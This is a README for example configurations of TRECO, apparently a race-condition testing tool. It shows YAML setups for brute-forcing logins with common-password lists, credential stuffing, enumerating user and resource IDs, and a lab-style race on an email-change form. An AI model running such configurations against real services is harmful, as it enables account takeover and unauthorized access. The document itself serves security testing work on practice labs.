# Dynamic Input Sources for Race Attacks

This directory contains examples demonstrating the dynamic input sources feature in TRECO. This feature enables each thread in a race attack to send different values, making it possible to perform brute-force attacks, credential stuffing, enumeration, and more.

## Overview

TRECO supports multiple ways to provide dynamic input values to threads during race condition attacks:

### Input Sources

1. **Inline List**: Direct list of values in YAML
2. **File Source**: Load values from external files or built-in wordlists
3. **Generator Source**: Generate values using Jinja2 expressions
4. **Range Source**: Generate numeric sequences

### Distribution Modes

1. **`same`** (default): All threads get the same value (backward compatible)
2. **`distribute`**: Round-robin distribution of values across threads
3. **`product`**: Cartesian product of all input variables
4. **`random`**: Random value per thread

## Examples

### 1. Distribute Mode (`01-distribute-mode.yaml`)

Each thread gets a unique password from a list. Ideal for brute-force attacks.

```yaml
entrypoint:
  input:
    username: "admin"
    passwords:
      - "password"
      - "123456"
      - "qwerty"

states:
  login_race:
    race:
      threads: 10
      input_mode: distribute  # Each thread gets different password
    
    request: |
      POST /login HTTP/1.1
      username={{ username }}&password={{ input.password }}
```

**Thread Distribution:**
- Thread 0: password="password"
- Thread 1: password="123456"
- Thread 2: password="qwerty"
- Thread 3: password="password" (cycles)
- ...

### 2. Product Mode (`02-product-mode.yaml`)

Tests all combinations of usernames and passwords. Perfect for credential stuffing.

```yaml
entrypoint:
  input:
    usernames: ["admin", "root", "test"]
    passwords: ["admin123", "password", "root123"]

states:
  credential_stuffing:
    race:
      threads: 9  # 3 users × 3 passwords
      input_mode: product
    
    request: |
      {"username": "{{ input.username }}", "password": "{{ input.password }}"}
```

**Thread Distribution:**
- Thread 0: admin:admin123
- Thread 1: admin:password
- Thread 2: admin:root123
- Thread 3: root:admin123
- ... (all 9 combinations)

### 3. File Source (`03-file-source.yaml`)

Load passwords from wordlist files.

```yaml
entrypoint:
  input:
    passwords:
      source: file
      path: "builtin:passwords-top-100"  # Built-in wordlist

states:
  wordlist_attack:
    race:
      threads: 50
      input_mode: distribute
```

**Built-in Wordlists:**
- `builtin:passwords-top-100` - Common passwords
- `builtin:usernames-common` - Common usernames

**Custom Wordlists:**
```yaml
passwords:
  source: file
  path: "/path/to/my-wordlist.txt"
```

### 4. Generator Source (`04-generator-source.yaml`)

Generate values dynamically using Jinja2 expressions.

```yaml
entrypoint:
  input:
    user_ids:
      source: generator
      expression: "{{ 1000 + index }}"
      count: 100

states:
  enumerate_users:
    request: |
      GET /api/users/{{ input.user_id }} HTTP/1.1
```

**Generated Values:**
- Thread 0: user_id=1000
- Thread 1: user_id=1001
- Thread 2: user_id=1002
- ...

**Advanced Expressions:**
```yaml
# Formatted strings
expression: "ID-{{ '%04d' | format(index) }}"
# Output: ID-0000, ID-0001, ID-0002, ...

# Random tokens
expression: "{{ '%08x' | format(range(0, 16777215) | random) }}"
```

### 5. Range Source (`05-range-source.yaml`)

Simple numeric sequences without Jinja2.

```yaml
entrypoint:
  input:
    resource_ids:
      source: range
      start: 1
      count: 50

states:
  scan_resources:
    request: |
      GET /api/resources/{{ input.resource_id }} HTTP/1.1
```

**Range Options:**
```yaml
# Option 1: start + count
source: range
start: 100
count: 50     # Generates: 100, 101, ..., 149

# Option 2: start + end
source: range
start: 100
end: 150      # Generates: 100, 101, ..., 149

# Option 3: count only (starts at 0)
source: range
count: 10     # Generates: 0, 1, ..., 9
```

## State-Level Input Override

States can override entrypoint input for specific race attacks:

```yaml
entrypoint:
  state: login
  input:
    username: "wiener"
    password: "peter"

states:
  login:
    request: |
      POST /login HTTP/1.1
      username={{ username }}&password={{ password }}
    next:
      - goto: race_email_change

  race_email_change:
    # Override input for this specific state
    input:
      emails:
        - "attacker@evil.com"
        - "carlos@target.com"
    
    race:
      threads: 2
      input_mode: distribute
    
    request: |
      POST /change-email HTTP/1.1
      email={{ input.email }}
```

## Accessing Input Values

Input values are available in templates via the `input` namespace:

```yaml
request: |
  POST /login HTTP/1.1
  
  username={{ input.username }}&password={{ input.password }}

logger:
  on_thread_leave: |
    {% if response.status_code == 200 %}
    ✅ Success with {{ input.password }}
    {% else %}
    ❌ Failed with {{ input.password }}
    {% endif %}
```

## Running Examples

```bash
# Set target host
export TARGET_HOST="example.com"

# Run distribute mode example
treco examples/input-sources/01-distribute-mode.yaml

# Run product mode example
treco examples/input-sources/02-product-mode.yaml

# Run wordlist example
treco examples/input-sources/03-file-source.yaml

# Run generator example
treco examples/input-sources/04-generator-source.yaml

# Run range example
treco examples/input-sources/05-range-source.yaml
```

## Best Practices

1. **Choose the right mode:**
   - `distribute`: Brute-force, enumeration
   - `product`: Credential stuffing, combination testing
   - `random`: Fuzzing, load testing
   - `same`: Traditional race conditions (default)

2. **Thread count:**
   - Match thread count to number of values for efficiency
   - More threads than values: Values cycle automatically
   - More values than threads: Only first N values used

3. **Wordlists:**
   - Use built-in wordlists for quick tests
   - Create custom wordlists for targeted attacks
   - One value per line, empty lines skipped

4. **Generator expressions:**
   - Use `index` or `i` variable for sequential values
   - Combine with Jinja2 filters for formatting
   - Keep expressions simple for performance

## Troubleshooting

**Issue: "No input source configured"**
- Check that input block exists in entrypoint or state
- Verify input variable names match template usage

**Issue: "Template engine required for generator source"**
- Generator source needs template engine (should work automatically)
- Contact support if this error persists

**Issue: "Wordlist not found"**
- Check file path is correct
- For built-in wordlists, use `builtin:` prefix
- Custom paths should be absolute or relative to working directory

**Issue: Input values not changing between threads**
- Verify `input_mode` is set (default is "same")
- Check input variable is accessed via `{{ input.varname }}`
- Ensure input is defined in entrypoint or state level

## See Also

- Main README: `../../README.md`
- Configuration Reference: `../../docs/`
- PortSwigger Labs: Race condition examples
